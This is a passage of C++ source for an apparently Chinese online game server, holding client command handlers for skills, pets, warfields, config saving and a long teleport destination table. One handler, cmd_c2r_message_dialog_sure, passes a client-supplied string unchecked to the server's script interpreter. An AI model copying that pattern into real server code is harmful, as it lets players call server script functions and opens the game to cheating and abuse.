		   CmdGiver->UpdateToClient(NET_CRE_UPDATE_ATTR_ALL);
	   }

	   ret = CmdGiver->m_core.AddBaseHit(HitVariation,CmdGiver->IsChengBody());   
	   if(ret)
	   {
		   CmdGiver->UpdateToClient(NET_CRE_UPDATE_ATTR_ALL);
	   }
	}

	if(ret)
	{
		CmdGiver->UpdateToClient(NET_CRE_UPDATE_ATTR_ALL);
	}
	return CMD_ERROR_NONE;
}


CMD_FUNCTION(cmd_c2r_subsystem_mail)
{
	GET_PARAMS();
	// subsystem process msg
	// int Process(CRegionCreature* CmdGiver,CG_CmdPacket *Packet)
	CRegionCreature *cre=g_region->m_cmdGiver;
	if(!cre->m_scene)
		return CMD_ERROR_UNKNOWN;

	return cre->m_pMail->ReceiveFromClient(CmdGiver,cmd);
}

CMD_FUNCTION(cmd_c2r_subsystem_team)
{
	GET_PARAMS();

	CRegionCreature *cre = g_region->m_cmdGiver;
	if(!cre->m_scene)
		return CMD_ERROR_UNKNOWN;

	return cre->m_pTeam->ReceiveFromClient(CmdGiver,cmd);
}

CMD_FUNCTION(cmd_c2r_master_list)
{
	GET_PARAMS();
	CRegionCreature *cre = g_region->m_cmdGiver;
	if(!cre->m_scene)
		return CMD_ERROR_UNKNOWN;

	return g_region->m_MasterList.ReceiveFromClient(cre,cmd);
}

CMD_FUNCTION(cmd_c2r_warfield_enter)
{
	GET_PARAMS();
	char nFaction;
	SAFE_READ(cmd->ReadByte(&nFaction));
	CRegionCreature *cre = g_region->m_cmdGiver;
	if(!cre->m_scene)
		return CMD_ERROR_UNKNOWN;

	const char* szMsg = g_WarfieldMgr.RequestEnter(CmdGiver->m_userInfo,nFaction);

	if(szMsg)
	{
		CmdGiver->SendSystemMessage(szMsg);
	}

	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_warfield_view)
{
	GET_PARAMS();
	CRegionCreature *cre = g_region->m_cmdGiver;
	if(!cre->m_scene)
		return CMD_ERROR_UNKNOWN;

	g_WarfieldMgr.UpdateClientData(cre);

	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_warfield_leave)
{
	GET_PARAMS();
	CRegionCreature *cre = g_region->m_cmdGiver;
	if(!cre->m_scene)
		return CMD_ERROR_UNKNOWN;

	g_WarfieldMgr.RequestLeave(CmdGiver->m_userInfo);

	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_subsystem_item)
{
	GET_PARAMS();
	return ItemCmdProcess_Svr(CmdGiver, cmd);
}

CMD_FUNCTION(cmd_c2r_subsystem_union)
{
	GET_PARAMS();
	return UnionCmdProcess_Svr(CmdGiver, cmd);
}

CMD_FUNCTION(cmd_c2r_subsystem_feod)
{
	GET_PARAMS();
	return FeodCmdProcess_Svr(CmdGiver, cmd);
}

//----------------------add start by tony 05.06.02---------------------------//
CMD_FUNCTION(cmd_c2r_subsystem_castlewar)
{
	GET_PARAMS();
	return CastleWarCmdProcess_FromGC(CmdGiver, cmd);
}
CMD_FUNCTION(cmd_c2r_subsystem_auction)
{
    //return CMD_ERROR_NONE;
	GET_PARAMS();
	return AuctionCmdProcess_FromGC(CmdGiver, cmd);
}
//----------------------add start by tony 05.06.02---------------------------//
//rendh 2010.01.21
CMD_FUNCTION(cmd_c2r_subsystem_linesys)
{
	GET_PARAMS();
	return LineSysCmdProcess_FromGC(CmdGiver, cmd);
}
//rendh 2010.01.21
CMD_FUNCTION(cmd_c2r_interactive_npc)
{
	GET_PARAMS();

	DWORD id;
	if(!cmd->ReadLong((long*)&id))
    {
        LOG("c2r_interactive_npc: Data Error\n");
        return CMD_ERROR_READ_DATA;
    }

	CRegionCreature *cre;
	cre = CmdGiver->m_scene->FindCreature(id);
	if(!cre)
    {
        LOG1("c2r_interactive_npc: Creature [%d] cannot found\n", id);
		return CMD_ERROR_UNKNOWN;
    }
	
	if(cre->m_npcId == 1958 && id != CmdGiver->m_curHuiYuanHoptoadOid)
	{
		CmdGiver->SendSystemMessage(R(MSG_HUIYUAN_CANTSHOP));
		return CMD_ERROR_UNKNOWN;
	}

	if(cre->Distance(CmdGiver->m_pos) > 240)
    {
        LOG1("c2r_interactive_npc: Distance too far\n", id);
		return CMD_ERROR_UNKNOWN;
    }

	if (CmdGiver->m_pPShop || CmdGiver->m_pTrade)
    {
        LOG1("c2r_interactive_npc: player state error\n", id);
		return CMD_ERROR_UNKNOWN;
    }

	//LeiJun 取消不是NPC返回的功能
	//if (!cre->m_npcInfo)
 //   {
 //       LOG1("c2r_interactive_npc: not interactive npc\n", id);
	//	return CMD_ERROR_UNKNOWN;
	//}

	if (cre->triggerID && cre->m_npcInfo->Type == 7)
	{
		CmdGiver->StartTrigger(cre);
		return CMD_ERROR_UNKNOWN;
	}
	
	if (!CmdGiver->GetPlayerLogic()->IsLive())
	{
		return CMD_ERROR_UNKNOWN;
	}

	/*Tianh*除国战外不存在敌对的阵营了*/
	// 不同阵营不可以交互
	//if ( (cre->m_npcInfo->Faction==FACTION_SHANG||cre->m_npcInfo->Faction==FACTION_ZHOU) && (cre->m_npcInfo->Faction != CmdGiver->m_core.Faction) )
	//	return CMD_ERROR_NONE;

	cre->Interactive(CmdGiver, cmd);
	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_message_dialog_sure)
{
	//4.2 LeiJun
	GET_PARAMS();

	char *pCommand = 0;
	if(!cmd->ReadString(&pCommand))
	{
		LOG("c2r_message_dialog_sure: Data Error\n");
		return CMD_ERROR_READ_DATA;
	}

	if(CmdGiver->IsScriptLoaded() && pCommand[0] != '\0')
		CmdGiver->CallScript(pCommand, false);
	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_herolist_query)
{
	GET_PARAMS();

	long listVersion;
	SAFE_READ(cmd->ReadLong(&listVersion));

	if (listVersion!=g_region->m_HeroList.m_version)
	{
		g_sendCmd->BeginWrite();
		g_sendCmd->WriteShort(r2c_herolist);
		g_sendCmd->WriteLong(g_region->m_HeroList.m_version);
		g_region->m_HeroList.Serialize(g_sendCmd);
		CmdGiver->RecvCmd(g_sendCmd);
	}
	
	CG_CmdPacket& command = g_region->m_gws.BeginSend();
	command.WriteShort(r2g_herolist_query);
	command.WriteLong(g_region->m_HeroList.m_version);
	g_region->m_gws.EndSend();

	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_cancel_task)
{
	GET_PARAMS();

	long taskId;
	SAFE_READ(cmd->ReadLong(&taskId));
	
	CmdGiver->CancelTask(taskId,true);
	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_study_life_skill)
{
	GET_PARAMS();
	short skillID;
	SAFE_READ(cmd->ReadShort(&skillID));

	if ( skillID == SKILL_DIG_SKIN_ID || skillID == SKILL_DIG_ORZ_ID || skillID == SKILL_DIG_DRUG_ID )
	{

		if ( !CmdGiver->RemoveGold(50) )
			return CMD_ERROR_NONE;
		if (CmdGiver->m_Skill.HaveCollectSkill())
			return CMD_ERROR_NONE;
		CmdGiver->m_Skill.StudySkill(skillID, true);
		return CMD_ERROR_NONE;
	}
	if ( skillID == SKILL_MAKE_EQUIP_ID || skillID == SKILL_MAKE_WEAPON_ID || skillID == SKILL_MAKE_LEECHDOM_ID )
	{

		if ( !CmdGiver->RemoveGold(500) )
			return CMD_ERROR_NONE;
		if (CmdGiver->m_Skill.HaveProtectSkill())
			return CMD_ERROR_NONE;
		CmdGiver->m_Skill.StudySkill(skillID, true);
	}
	return CMD_ERROR_NONE;
}

//Tianh 删除生活技能
CMD_FUNCTION(cmd_c2r_delete_life_skill)
{
	GET_PARAMS();
	short skillID;
	SAFE_READ(cmd->ReadShort(&skillID));

	CmdGiver->DeleteLifeSkill(skillID);
	
	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_study_skill)
{
    GET_PARAMS();
    short skillID;
    SAFE_READ(cmd->ReadShort(&skillID));
	if ( CmdGiver->m_Skill.StudySkill(skillID, true) )
	{
		SSkill *pSkill = Skill()->FindLastLevelSkill(skillID);
		if ( pSkill && pSkill->wClass == 13 )	// 法宝技能
		{
			SItemID trump = CmdGiver->m_pItemContainer->GetEquipItem(CItemContainerBase::TRUMP, true);
			if (ItemID_IsValid(trump))
			{
				int i;
				for (i=TRUMP_SKILL_1;i<TRUMP_SKILL_MAX;i++)
				{
					if (trump.params[i] == pSkill->wID)
					{
						trump.params[i] = skillID;
						CmdGiver->UpdateEquipTrump(trump);
						break;
					}
				}
				if (i == TRUMP_SKILL_MAX)
				{
					CmdGiver->m_Skill.DeleteSkill(skillID,true);
				}
			}else
			{
				CmdGiver->m_Skill.DeleteSkill(skillID,true);
			}
		}
	}
    //CmdGiver->m_Skill.StudySkill(skillID, true);
    return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_shortcut)
{
	GET_PARAMS();

	char* shortcut;
	SAFE_READ(cmd->ReadString(&shortcut));
	CmdGiver->m_shortcut = shortcut;

 //   short sIcon;
 //   char cVersion, cIdx, cType, cFirst, *pStr;
 //   long id1, id2;

	//SAFE_READ(cmd->ReadByte(&cVersion));
 //   if (cVersion!=1) return CMD_ERROR_READ_DATA;
 //   rt2_sprintf(g_strStaticBuffer, "%d", cVersion);
 //   pStr = g_strStaticBuffer + strlen(g_strStaticBuffer);

 //   cFirst = 1;
 //   while (cmd->ReadByte(&cIdx))
 //   {
 //       if (pStr-g_strStaticBuffer > 1000)
 //           return CMD_ERROR_NONE; // 发现错误，存盘失败
 //       if (cIdx==-1)
 //       {
 //           if (cFirst==0)
 //           {
 //               *pStr = '}'; pStr ++;
 //           }else
 //           {
 //               cFirst = 0;
 //           }
 //           *pStr = '{'; pStr ++;
 //       }else
 //       {
 //           rt2_sprintf(pStr, "%d;", cIdx); pStr = pStr + strlen(pStr);

	//        SAFE_READ(cmd->ReadByte(&cType));
 //           switch (cType)
 //           {
 //           case 0:
 //               rt2_sprintf(pStr, "{}"); pStr = pStr + strlen(pStr);
 //               break;
 //           case 1:
	//            SAFE_READ(cmd->ReadShort(&sIcon));
 //               rt2_sprintf(pStr, "%d{%d}", cType, sIcon); pStr = pStr + strlen(pStr);
 //               break;
 //           case 2:
	//            SAFE_READ(cmd->ReadByte(&cVersion));
	//            SAFE_READ(cmd->ReadLong(&id1));
	//            SAFE_READ(cmd->ReadLong(&id2));
 //               rt2_sprintf(pStr, "%d{%d;%d;%d}", cType, cVersion, id1, id2); pStr = pStr + strlen(pStr);
 //               break;
 //           case 3:
	//            SAFE_READ(cmd->ReadByte(&cVersion));
	//            SAFE_READ(cmd->ReadLong(&id1));
 //               rt2_sprintf(pStr, "%d{%d;%d}", cType, cVersion, id1); pStr = pStr + strlen(pStr);
 //               break;
 //           default:
	//            return CMD_ERROR_NONE; // 发现错误，存盘失败
 //               break;
 //           }
 //       }
 //   }
 //   *pStr = '}'; pStr ++;
 //   *pStr = 0;

	//CmdGiver->m_shortcut = g_strStaticBuffer;

	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_save_config)
{
	GET_PARAMS();

    char cVersion, cConfigID;
    short sValue;

 	SAFE_READ(cmd->ReadByte(&cVersion));

    g_strStaticBuffer[0] = 0;
    if (cVersion==1)
    {
        int iCnt = 0;
        rt2_sprintf(g_strStaticBuffer, "%d", cVersion);
        while (cmd->ReadByte(&cConfigID))
        {
 	        SAFE_READ(cmd->ReadShort(&sValue));
            rt2_snprintf(g_strStaticBuffer+strlen(g_strStaticBuffer),2048-strlen(g_strStaticBuffer), ",%d,%d", cConfigID, sValue);
            iCnt ++;
            if (cConfigID==7 || cConfigID==8)
            {
                // 这是客户端的外挂检查指令
                CmdGiver->WgChecked(120,600,WG_INFO_CLIENT_CONFIG);
                continue;
            }
			else if ( cConfigID == 6 && !CmdGiver->IsInCombat() )
			{
				CmdGiver->m_ePkMode = (EPkMode)sValue;
			}
            if (iCnt>20) // 最多只能保存20个配置
            {
                return CMD_ERROR_NONE;
            }
        }
    }
    if (strlen(g_strStaticBuffer)>200) g_strStaticBuffer[199] = 0;
	CmdGiver->m_configData = g_strStaticBuffer;
	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_query_task_overhead)
{
	GET_PARAMS();
	
	/*unsigned long dwTime = rtGetMilliseconds();
	if(dwTime < CmdGiver->GetPlayerLogic()->GetNextOverHeadTime())
	{
		return CMD_ERROR_NONE;
	}*/
	//return CMD_ERROR_NONE;
	long npcOID;
	SAFE_READ(cmd->ReadLong(&npcOID));

	ETaskOverHead state = CmdGiver->GetPlayerLogic()->GetTaskOverHead(npcOID);
	//CmdGiver->GetPlayerLogic()->SetNextOverHeadTime(dwTime + 4000);
	if (state!=TOH_Unknown)
    if (1)
	{
		g_sendCmd->BeginWrite();
		g_sendCmd->WriteShort(r2c_task_overhead);
		g_sendCmd->WriteLong(npcOID);
		g_sendCmd->WriteByte((char)state);
		CmdGiver->RecvCmd(g_sendCmd);

		/*unsigned long dwS =  rtGetMilliseconds() - dwTime;
		std::ostringstream os;
		os<<CmdGiver->m_core.Name<<" cmd_c2r_query_task_overhead "<<dwS<<endl;
		ERR(os.str().c_str());*/
		return CMD_ERROR_NONE;
	}
	else 
	{
		return CMD_ERROR_NONE;
	}
}

CMD_FUNCTION(cmd_c2r_mw_add_mp)
{
	GET_PARAMS();
	
	char op;
	cmd->ReadByte(&op);
	if(op == 1)
	{
		CmdGiver->MagicWeaponBeginAddMp();
	}
	else
	{
		CmdGiver->MagicWeaponEndAddMp();
	}
	return CMD_ERROR_NONE;
}


CMD_FUNCTION(cmd_c2r_mw_add_ele)
{
	GET_PARAMS();

	char stop;
	char rifine; 
	cmd->ReadByte(&stop);
	if(stop == 1)
	{
		CmdGiver->MagicWeaponEndAddEle();
		return CMD_ERROR_NONE;
	}
	cmd->ReadByte(&rifine);

	int page, i, j;

	SItemID trump = CmdGiver->m_pItemContainer->GetEquipItem(CItemContainerBase::TRUMP, true);

	if( (!ItemID_IsValid(trump) || !ItemIsTrump(trump)))
	{
		return CMD_ERROR_NONE;
	}

	if(rifine < 0 || rifine >= MAX_TRUMP_RIFINE) return CMD_ERROR_UNKNOWN;

	if (ItemID_IsValid(CmdGiver->m_RifineTrump))
	{
		CmdGiver->MagicWeaponEndAddEle();
		return CMD_ERROR_NONE;
	}

	CmdGiver->m_RifineTrump = trump;
	CmdGiver->MagicWeaponBeginAddEle(rifine);
	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_print_my_data)
{
	GET_PARAMS();

//	SCreature *pCore = &(CmdGiver->m_core);
//	// Print Player's Data:
//	LOG1("\n---------------------------- %s's Data ---------------------------\n", CmdGiver->m_core.Name.c_str());
//	LOG3("DamageMin =	(Base=%d, Temp=%d, Rate=%f)\n", pCore->DamageMin.Base, pCore->DamageMin.Temp, pCore->DamageMin.Rate);
//	LOG3("DamageMax =	(Base=%d, Temp=%d, Rate=%f)\n", pCore->DamageMax.Base, pCore->DamageMax.Temp, pCore->DamageMax.Rate);
//	LOG3("Armor =		(Base=%d, Temp=%d, Rate=%f)\n", pCore->Armor.Base, pCore->Armor.Temp, pCore->Armor.Rate);
//	LOG3("Attack =		(Base=%d, Temp=%d, Rate=%f)\n", pCore->Attack.Base, pCore->Attack.Temp, pCore->Attack.Rate);
//	LOG3("Dodge =		(Base=%d, Temp=%d, Rate=%f)\n", pCore->Dodge.Base, pCore->Dodge.Temp, pCore->Dodge.Rate);
//	LOG3("MaxHP =		(Base=%d, Temp=%d, Rate=%f)\n", pCore->MaxHp.Base, pCore->MaxHp.Temp, pCore->MaxHp.Rate);
//	LOG3("MaxMP =		(Base=%d, Temp=%d, Rate=%f)\n", pCore->MaxMp.Base, pCore->MaxMp.Temp, pCore->MaxMp.Rate);
//	LOG3("AttSpeed =	(Base=%d, Temp=%d, Rate=%f)\n", pCore->AttSpeed.Base, pCore->AttSpeed.Temp, pCore->AttSpeed.Rate);
//	LOG3("MovSpeed =	(Base=%d, Temp=%d, Rate=%f)\n", pCore->MovSpeed.Base, pCore->MovSpeed.Temp, pCore->MovSpeed.Rate);
//	LOG3("AttackRange =	(Base=%d, Temp=%d, Rate=%f)\n", pCore->AttackRange.Base, pCore->AttackRange.Temp, pCore->AttackRange.Rate);
//	LOG3("CriticalHit =	(Base=%d, Temp=%d, Rate=%f)\n", pCore->CriticalHit.Base, pCore->CriticalHit.Temp, pCore->CriticalHit.Rate);
//	LOG3("DamageAbsorb =(Base=%d, Temp=%d, Rate=%f)\n", pCore->DamageAbsorb.Base, pCore->DamageAbsorb.Temp, pCore->DamageAbsorb.Rate);
//	LOG1("Money =		(%d)\n", CmdGiver->m_pItemContainer->GetMoney());
////	LOG1("Items =		(%s)\n", CmdGiver->m_pItemContainer->SaveToString());
//	LOG("--------------------------------------------------------------------\n");
	
	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_recover_pet)
{
	GET_PARAMS();

	long itemId;
	long npcId;
	if(!cmd->ReadLong(&itemId)) return CMD_ERROR_READ_DATA;
	//---------add start by tony 06.05.18-------------------------//
	//-reason: 修正外挂直接复活宠物,传送npcid上来作检查
	if(!cmd->ReadLong(&npcId)) return CMD_ERROR_READ_DATA;
	CRegionCreature *cre = CmdGiver->m_scene->FindCreature(npcId);
	if(!cre) return CMD_ERROR_NONE;

	if(CmdGiver->Distance(cre->m_pos) > 240)
	{
		return CMD_ERROR_NONE;
	}
	//---------add start by tony 06.05.18-------------------------//
	
	SItemID item;
	int page, i, j;
	if( CmdGiver->m_pItemContainer->m_Bag.Find(itemId, &page, &i, &j) )
	{
		item = CmdGiver->m_pItemContainer->m_Bag.GetItem(page,i,j);
		if(!ItemIsPet(item)) return CMD_ERROR_NONE;

		if(item.params[PET_PARAM_HP] != 0) return CMD_ERROR_NONE;
		
		int cost = PT_GetRecoverGold(item);
		if(CmdGiver->GetGold() < cost) 
		{
			rt2_sprintf(g_strStaticBuffer, R(MSG_PET_NOTMONEY));
			CmdGiver->SendSystemMessage(g_strStaticBuffer);		
			return CMD_ERROR_NONE;
		}
		CmdGiver->AddGold(-cost);	
		item.params[PET_PARAM_HP] = 100;
		CmdGiver->m_pItemContainer->m_Bag.SetItem(page,i,j,item);

		CmdGiver->m_pItemContainer->UpdateItemToClient(ITEM_CONTAINER_PLAYER_COMMON_BAG, page, i, j);

		rt2_sprintf(g_strStaticBuffer, R(MSG_RECOVER_PET_OK));
		CmdGiver->SendSystemMessage(g_strStaticBuffer);
		
		/*
		g_sendCmd->BeginWrite();
		g_sendCmd->WriteShort(r2c_recover_pet_ret);
		CmdGiver->RecvCmd(g_sendCmd);
		*/
	}
	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_play_pose)
{
	GET_PARAMS();
	
    short pose;
	char  dir;
	
	if(g_region->m_time < CmdGiver->m_lastEmoteTime+500) return CMD_ERROR_NONE;
	if(!cmd->ReadShort(&pose)) return CMD_ERROR_READ_DATA;
	if(!cmd->ReadByte(&dir)) return CMD_ERROR_READ_DATA;
	
	CmdGiver->m_lastEmoteTime = g_region->m_time;
	g_region->BuildEventPlayPose(g_sendCmd,CmdGiver,pose,dir);
	CmdGiver->m_scene->BroadcastCmd(CmdGiver->m_pos, DEFAULT_RANGE, g_sendCmd, NULL);
		
	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_teleport)
{
	GET_PARAMS();

    long npcId;
	char *city;

	long cost=0,item=0,credit=0;
	if(!cmd->ReadLong(&npcId)) return CMD_ERROR_READ_DATA;
	if(!cmd->ReadString(&city)) return CMD_ERROR_READ_DATA;

	CRegionCreature *cre = CmdGiver->m_scene->FindCreature(npcId);
	if(!cre) return CMD_ERROR_NONE;

	//tim.yang  传送的时间判断
	if (!cre->isteleport(cre->m_npcId))
	{
		return CMD_ERROR_NONE;
	}
	//end
	if(cre->Distance(CmdGiver->m_pos) > 400) return CMD_ERROR_NONE;
	if(CmdGiver->GetPKState() == PK_STATE_RED_NAME) return CMD_ERROR_NONE;

	bool valid = true;
	long pos[3] = {100,100,1};

	// 催粮任务期间无法使用传送
	if(CmdGiver->IsDoingMoneyTask())
	{
		CmdGiver->SendSystemMessage(R(MSG_TASK_CANNOT_TELEPORT));
		return CMD_ERROR_NONE;
	}


static int BASE_TRANSPORT_PRICE;
static CIniVariable Temp(GetGameRule(),"GamePriceRule","BaseTransportPrice",BASE_TRANSPORT_PRICE);

	if(strcmp(city,"movetoshouyangshan") == 0)
	{
		cost = 1*BASE_TRANSPORT_PRICE;
		pos[0] = 890;
		pos[1] = 1730;
	}
	else if(strcmp(city,"movetoshouyangshan2") == 0)
	{
		cost = 3*BASE_TRANSPORT_PRICE;
		pos[0] = 890;
		pos[1] = 1730;
	}
	else if(strcmp(city,"movetoxiqi") == 0)
	{
		//-----------add start by tony 05.07.15----------------------//
		if(g_RegionCastleWarMgr.IsCastleWarTime("XiQi") == true)
		{
			valid = false;
		}
		//-----------add end   by tony 05.07.15----------------------//
		if(CmdGiver->m_core.Lev < 10) valid = false;
		cost = 1*BASE_TRANSPORT_PRICE;
		pos[0] = 7390;
		pos[1] = -6950;
	}
	/* new added */
	else if(strcmp(city,"movetoupshang1") == 0)
	{
		cost = 0;
		pos[0] = -12527;
		pos[1] = 3330;
	}
	/*else if(strcmp(city,"movetodownxiqi2") == 0)//tim.yang  注释掉地宫功能
	{
		cost = 0;
		pos[0] = -35575;
		pos[1] = -8416;
	}
	else if(strcmp(city,"movetodownzhaoge2") == 0)
	{
		cost = 0;
		pos[0] = -29956;
		pos[1] = 7459;
	}*/
	else if(strcmp(city,"movetoupzhou1") == 0)
	{
		cost = 0;
		pos[0] = -12603;
		pos[1] = -8587;
	}
	/**/
	else if(strcmp(city,"movetoshishui") == 0)
	{
		if(CmdGiver->m_core.Lev < 20) valid = false;
		cost = 1*BASE_TRANSPORT_PRICE;
		pos[0] = 12250;
		pos[1] = -10505;
	}
	else if(strcmp(city,"movetojiepai") == 0)
	{
		if(CmdGiver->m_core.Lev < 30) valid = false;
		cost = 1*BASE_TRANSPORT_PRICE;
		pos[0] = 18710;
		pos[1] = -9468;
	}
	else if(strcmp(city,"movetochuanyun") == 0)
	{
		if(CmdGiver->m_core.Lev < 40) valid = false;
		cost = 1*BASE_TRANSPORT_PRICE;
		pos[0] = 27733;
		pos[1] = -7153;
	}
	else if(strcmp(city,"movetochuanyun2") == 0)
	{
		if(CmdGiver->m_core.Lev < 40) valid = false;
		cost = 3*BASE_TRANSPORT_PRICE;
		pos[0] = 27733;
		pos[1] = -7153;
	}
	else if(strcmp(city,"movetozhaoge") == 0)
	{
		//-----------add start by tony 05.07.15----------------------//
		if(g_RegionCastleWarMgr.IsCastleWarTime("ZhaoGe") == true)
		{
			valid = false;
		}
		//-----------add end   by tony 05.07.15----------------------//
		
		if(CmdGiver->m_core.Lev < 10) valid = false;
		cost = 1*BASE_TRANSPORT_PRICE;
		pos[0] = 55210;
		pos[1] = -7990;
	}
	else if(strcmp(city,"movetolintong") == 0)
	{
		if(CmdGiver->m_core.Lev < 20) valid = false;
		cost = 1*BASE_TRANSPORT_PRICE;
		pos[0] = 44234;
		pos[1] = -2529;
	}
	else if(strcmp(city,"movetotongguan") == 0)
	{
		if(CmdGiver->m_core.Lev < 30) valid = false;
		cost = 1*BASE_TRANSPORT_PRICE;
		pos[0] = 36609;
		pos[1] = -9190;
	}
	else if(strcmp(city,"movetolongmens") == 0)
	{
		cost = 1*BASE_TRANSPORT_PRICE;
		pos[0] = 50410;
		pos[1] = -16870;
	}
	else if(strcmp(city,"movetolongmens2") == 0)
	{
		cost = 3*BASE_TRANSPORT_PRICE;
		pos[0] = 50410;
		pos[1] = -16870;
	}
	else if(strcmp(city,"movetobackshang") == 0)
	{
		if(CmdGiver->m_core.Lev < 30) valid = false;
		cost = 1*BASE_TRANSPORT_PRICE;
		pos[0] = 36610;
		pos[1] = -9190;
	}
	else if(strcmp(city,"movetobackzhou") == 0)
	{
		if(CmdGiver->m_core.Lev < 30) valid = false;
		cost = 1*BASE_TRANSPORT_PRICE;
		pos[0] = 18690;
		pos[1] = -9470;
	}
	else if(strcmp(city,"movetoxuni1") == 0)
	{
		if(!g_region->IsFunActive(true) && !g_region->IsFunActive(false))
			valid = false;
		item = 648;
        if(CmdGiver->m_core.Faction == FACTION_ZHOU)
		{
			pos[0] = 51835;
			pos[1] = -47720;
		}
		else
		{
			pos[0] = 52245;
			pos[1] = -48170;
		}
		if(CmdGiver->m_core.Lev<76 || CmdGiver->m_core.Lev>90)
			valid = false;
	}
	else if(strcmp(city,"movetoxuni2") == 0)
	{
		if(!g_region->IsFunActive(true) && !g_region->IsFunActive(false))
			valid = false;
		item = 649;
		if(CmdGiver->m_core.Faction == FACTION_ZHOU)
		{
			pos[0] = 40000;
			pos[1] = -47585;
		}
		else
		{
			pos[0] = 39990;
			pos[1] = -48465;
		}
		if(CmdGiver->m_core.Lev<61 || CmdGiver->m_core.Lev>75)
			valid = false;
	}
	else if(strcmp(city,"movetoxuni3") == 0)
	{
		if(!g_region->IsFunActive(true) && !g_region->IsFunActive(false))
			valid = false;
		item = 650;
		if(CmdGiver->m_core.Faction == FACTION_ZHOU)
		{
			pos[0] = 27500;
			pos[1] = -48000;
		}
		else
		{
			pos[0] = 28580;
			pos[1] = -48000;
		}
		if(CmdGiver->m_core.Lev<16 || CmdGiver->m_core.Lev>45)
			valid = false;
	}
	else if(strcmp(city,"movetoxuni9") == 0)
	{
		if(!g_region->IsFunActive(true) && !g_region->IsFunActive(false))
			valid = false;
		item = 656;
		if(CmdGiver->m_core.Faction == FACTION_ZHOU)
		{
			pos[0] = 63994;
			pos[1] = -47505;
		}
		else
		{
			pos[0] = 63974;
			pos[1] = -48710;
		} 
		if(CmdGiver->m_core.Lev<46)
			valid = false;
	}
    else if(strcmp(city,"movetoxuni4") == 0)
	{
		pos[0] = 3090;
		pos[1] = 2690;
	}
	else if(strcmp(city,"movetoxuni5") == 0)
	{
		pos[0] = 3350;
		pos[1] = -7949;
	}
	else if(strcmp(city,"movetoxuni6") == 0)
	{
		if(CmdGiver->m_core.Faction == FACTION_ZHOU)
		{
			pos[0] = 26451;
			pos[1] = -8090;
		}
		else
		{
			pos[0] = 29089;
			pos[1] = -8090;
		}
	}
	else if(strcmp(city,"movetoxuni7") == 0)
	{
		pos[0] = 48648;
		pos[1] = -16648;
	}
	else if(strcmp(city,"movetoxuni8") == 0)
	{
		pos[0] = 52130;
		pos[1] = -7629;
	}
	else if(strcmp(city,"movetoxuni10") == 0)
	{
		if(CmdGiver->m_core.Faction == FACTION_ZHOU)
		{
			pos[0] = 26508;
			pos[1] = -8049;
		}
		else
		{
			pos[0] = 29049;
			pos[1] = -8189;
		}
	}
	// 城门传送
	else if(strcmp(city,"flyin1") == 0)
	{
		if(g_RegionCastleWarMgr.IsCastleWarTime("XiQi"))
			valid = false;
		cost = BASE_TRANSPORT_PRICE/10;
		pos[0] = 4847;
		pos[1] = -8290;
	}
	else if(strcmp(city,"flyout1") == 0)
	{
		if(g_RegionCastleWarMgr.IsCastleWarTime("XiQi"))
			valid = false;
		cost = BASE_TRANSPORT_PRICE/10;
		pos[0] = 4252;
		pos[1] = -8090;
	}
	else if(strcmp(city,"flyin2") == 0)
	{
		if(g_RegionCastleWarMgr.IsCastleWarTime("XiQi"))
			valid = false;
		cost = BASE_TRANSPORT_PRICE/10;
		pos[0] = 6570;
		pos[1] = -6568;
	}
	else if(strcmp(city,"flyout2") == 0)
	{
		if(g_RegionCastleWarMgr.IsCastleWarTime("XiQi"))
			valid = false;
		cost = BASE_TRANSPORT_PRICE/10;
		pos[0] = 5732;
		pos[1] = -5831;
	}
	else if(strcmp(city,"flyin3") == 0)
	{
		if(g_RegionCastleWarMgr.IsCastleWarTime("XiQi"))
			valid = false;
		cost = BASE_TRANSPORT_PRICE/10;
		pos[0] = 6570;
		pos[1] = -9233;
	}
	else if(strcmp(city,"flyout3") == 0)
	{
		if(g_RegionCastleWarMgr.IsCastleWarTime("XiQi"))
			valid = false;
		cost = BASE_TRANSPORT_PRICE/10;
		pos[0] = 6450;
		pos[1] = -9950;
	}
	else if(strcmp(city,"flyin4") == 0)
	{
		// if(g_RegionCastleWarMgr.IsCastleWarTime("XiQi"))
		//	valid = false;
		cost = BASE_TRANSPORT_PRICE/10;
		pos[0] = 28270;
		pos[1] = -7330;
	}
	else if(strcmp(city,"flyout4") == 0)
	{
		// if(g_RegionCastleWarMgr.IsCastleWarTime("XiQi"))
		//	valid = false;
		cost = BASE_TRANSPORT_PRICE/10;
		pos[0] = 28888;
		pos[1] = -7569;
	}
	else if(strcmp(city,"flyin5") == 0)
	{
		// if(g_RegionCastleWarMgr.IsCastleWarTime("XiQi"))
		//	valid = false;
		cost = BASE_TRANSPORT_PRICE/10;
		pos[0] = 27307;
		pos[1] = -8110;
	}
	else if(strcmp(city,"flyout5") == 0)
	{
		// if(g_RegionCastleWarMgr.IsCastleWarTime("XiQi"))
		//	valid = false;
		cost = BASE_TRANSPORT_PRICE/10;
		pos[0] = 26693;
		pos[1] = -7929;
	}
	else if(strcmp(city,"flyin6") == 0)
	{
		if(g_RegionCastleWarMgr.IsCastleWarTime("ZhaoGe"))
			valid = false;
		cost = BASE_TRANSPORT_PRICE/10;
		pos[0] = 52809;
		pos[1] = -9230;
	}
	else if(strcmp(city,"flyout6") == 0)
	{
		if(g_RegionCastleWarMgr.IsCastleWarTime("ZhaoGe"))
			valid = false;
		cost = BASE_TRANSPORT_PRICE/10;
		pos[0] = 52216;
		pos[1] = -9096;
	}
	else if(strcmp(city,"flyin7") == 0)
	{
		if(g_RegionCastleWarMgr.IsCastleWarTime("ZhaoGe"))
			valid = false;
		cost = BASE_TRANSPORT_PRICE/10;
		pos[0] = 53750;
		pos[1] = -7508;
	}
